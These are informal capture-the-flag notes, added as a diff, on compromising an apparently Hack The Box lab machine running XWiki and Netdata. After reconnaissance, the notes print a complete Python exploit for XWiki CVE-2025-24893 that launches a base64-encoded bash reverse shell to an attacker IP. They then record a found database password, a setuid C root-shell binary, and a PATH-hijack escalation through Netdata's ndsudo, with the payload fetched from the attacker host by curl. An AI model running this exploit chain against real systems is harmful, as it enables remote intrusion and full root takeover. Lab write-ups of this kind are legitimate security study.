@@ -1,0 +1,202 @@
+nmap -sV editor.htb
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+8080/tcp open  http    Jetty 10.0.20
+
+wtf is a jetty, we will first check out the web page being hosted, also fire up burp in case we need it
+
+Webpage shows an IDE called SimplistCode Pro. There is an exe download as well as a .deb package???????????? Before moving on we will run subdirectory and subdomain enumeration:
+- feroxbuster -u http://editor.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+	- literally nothing except an assets/ subdirectory which is forbidden
+- ffuf -u http://editor.htb -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.editor.htb" -fs 154
+	- found a wiki subdomain, which is already on their homepage: http://wiki.editor.htb/xwiki/
+
+Nothing to be found on the wiki except installation instruction, which we can follow on our Kali host
+
+---
+
+Chroma says there is no need to rev eng the IDE binary, which makes sense for an easy box. We can shift our attention to port 8080 where Jetty is ran (backend server service stuff). See nmap output
+
+Redirect occurs when trying to access 8080; we are sent back to the wiki homepage. There is a login page on the wiki that we can access tho.
+
+There is also no way to sign UP for an account. We can note the Jetty server version as: Jetty 10.0.20
+- Chroma suggests to check low hanging fruit like robots.txt, this may be on the wiki page. We can run subdirectory enumeration against wiki.editor.htb to find any other artifacts:
+	- feroxbuster -u http://wiki.editor.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+		- Found 3 new subdomains:
+			- http://wiki.editor.htb/xwiki/bin/viewrev
+				- basically nothing
+			- http://wiki.editor.htb/xwiki/bin/pdf
+				- artifact from other user???????????????????????????????
+			- http://wiki.editor.htb/xwiki/bin/
+				- quite literally the wiki homepage
+				- 
+- Also check page source for version number of anything running
+	- Found nothing on the editor.htb homepage
+	- Found stuff on wiki.editor.htb:
+		- XWiki Debian 15.10.8
+
+Only two leads are the Xwiki version and Jetty version. 
+- We can find an RCE CVE for this xwiki deployment, we can find a python script to exploit here: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py
+	- Download the script and run it against the wiki.editor.htb/xwiki domain!
+		- lol no use editor.htb:8080/xwik <-- this
+		- basically the wiki page but goofy
+
+We get a big XML output. This proves nothing EXCEPT that RCE is possible, and we can get a rev shell from the web server. ChatGPT can provide a script based on the exploit in practice. Chroma provided the script to weaponize this RCE stuff:
+
+import requests
+import urllib.parse
+import base64
+
+# Banner
+def display_banner():
+    print("="*80)
+    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution (Reverse Shell)")
+    print("Modified for HTB CTF use")
+    print("="*80)
+
+# Function to detect the target protocol (HTTP or HTTPS)
+def detect_protocol(domain):
+    https_url = f"https://{domain}"
+    http_url = f"http://{domain}"
+
+    try:
+        response = requests.get(https_url, timeout=5, allow_redirects=True)
+        if response.status_code < 400:
+            print(f"[✔] Target supports HTTPS: {https_url}")
+            return https_url
+    except requests.exceptions.RequestException:
+        print("[!] HTTPS not available, falling back to HTTP.")
+
+    try:
+        response = requests.get(http_url, timeout=5, allow_redirects=True)
+        if response.status_code < 400:
+            print(f"[✔] Target supports HTTP: {http_url}")
+            return http_url
+    except requests.exceptions.RequestException:
+        print("[✖] Target is unreachable on both HTTP and HTTPS.")
+        exit(1)
+
+# Exploit function
+def exploit(target_url, attacker_ip, attacker_port):
+    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
+
+    # Build bash reverse shell command
+    bash_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
+    b64_cmd = base64.b64encode(bash_cmd.encode()).decode()
+
+    # Groovy payload to execute reverse shell
+    groovy_payload = f'"bash -c {{echo,{b64_cmd}}}|{{base64,-d}}|{{bash,-i}}".execute()'
+
+    # URL-encode the payload
+    encoded_payload = urllib.parse.quote(groovy_payload)
+
+    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7d{encoded_payload}%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
+
+    print(f"[+] Sending request to: {exploit_url}")
+    try:
+        response = requests.get(exploit_url, timeout=10)
+        print("[*] If target is vulnerable, you should get a reverse shell shortly.")
+    except requests.exceptions.RequestException as e:
+        print(f"[✖] Request error: {e}")
+
+# Main execution
+if __name__ == "__main__":
+    display_banner()
+    target = input("[?] Enter the target URL (without http/https): ").strip()
+    attacker_ip = input("[?] Enter your attacker IP: ").strip()
+    attacker_port = input("[?] Enter your listener port: ").strip()
+    exploit(target, attacker_ip, attacker_port)
+
+Enter the same URL as before then our IP and desired port using Penelope to get better shell.
+
+We are on the web server now. Some directory enumeration later, nothing is found, so linpeas is to the rescue for now. Curl is available so we can get it going easily.
+
+Navigate to /tmp to get into writable directory then get linpeas on host!
+
+Stuff found:
+- There is some process running w/ data in /var/lib/xwiki/data (PID 1044, nothing unusual here)
+- MySQL is on the box!
+- Some cronjob stuff:
+	- 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+	- 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+	- 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+	- 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+- Odd xml file?????????? /etc/tomcat9/server.xml and /usr/share/tomcat9/etc/server.xml
+- runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
+	- ????????????? will check this later
+- /usr/bin/gettext.sh?????????
+- /var/backups!!!!!!!!
+
+Chroma gave a hint towards an xml file hosting passwords????????????????? In /usr/lib/xwiki/WEB-INF, there are a few XML files. Normally, we would look through each of them for stuff but we were already given a hint towards the hibernate.cfg.xml file. We can find these creds, xwiki:theEd1t0rTeam99.
+
+ssh to get user flag for the OLIVER user, always check /home directory for users to ssh onto!!!!
+
+Tip from chroma is to linpeas again when getting on a new user/machine.
+- ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
+- /etc/mysql/debian.cnf MariaDB files???????
+- Readable files belonging to root and readable by me but not world readable
+-rw-rw---- 1 root netdata 4 Aug  4 23:13 /run/ebpf.pid                                                                                                         
+-rw-r----- 1 root oliver 33 Aug  4 23:13 /home/oliver/user.txt
+-rwxr-x--- 1 root netdata 21948 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/charts.d.plugin
+-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+-rwxr-x--- 1 root netdata 860296 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin
+-rwxr-x--- 1 root netdata 886928 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin
+-rwsr-x--- 1 root netdata 1377624 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+-rwxr-x--- 1 root netdata 1437424 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin
+-rwxr-x--- 1 root netdata 70000792 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin
+-rwxr-x--- 1 root netdata 10328 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network-helper.sh
+-rwxr-x--- 1 root netdata 27998 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/python.d.plugin
+-rwsr-x--- 1 root netdata 1144224 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+-rwsr-x--- 1 root netdata 81472 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
+-rwsr-x--- 1 root netdata 896448 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+-rwsr-x--- 1 root netdata 4261672 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+-rwxr-x--- 1 root netdata 6713 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping.plugin
+-rwxr-x--- 1 root netdata 863608 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin
+	- ndsudo can be ran by oliver?? appears that we can replace an executable that ndsudo can run with our own, which will run as root and give a shell maybe?
+		- nvme and megacli and execve can be ran by ndsudo.
+
+A GitHub issue is linked to this exact path as well: https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93
+
+Steps to exploit are:
+- echo -e '#!/bin/bash\n/bin/bash' > /tmp/nvme
+- chmod +x /tmp/nvme
+- export PATH=/tmp:$PATH to change the path to /tmp dir
+- /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list to run our malicious script (nvme-list will run the nvme script)
+
+ermmmmmm didn't work?
+
+---
+
+Chroma gave a massive script. We are on the right track to escalate, but it appears that a BINARY is needed to run as root. To complete this step, we need to create an nvme.c file to host our shell then export it to our ssh session:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+printf("Got root! Dropping shell...\n");
+setuid(0);
+setgid(0);
+execl("/bin/bash", "bash", "-p", NULL);
+perror("execl");
+return 1;
+}
+
+gcc nvme.c -o nvme -static
+
+python3 -m http.server
+
+Now we can curl the script from our ssh session then change our PATH env variables to point to our nvme binary:
+- cd /tmp
+- curl http://10.10.15.84:8000/nvme -o nvme
+- chmod +x nvme
+- export PATH=/tmp
+- /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+
+ggs get root flag
+
+
+
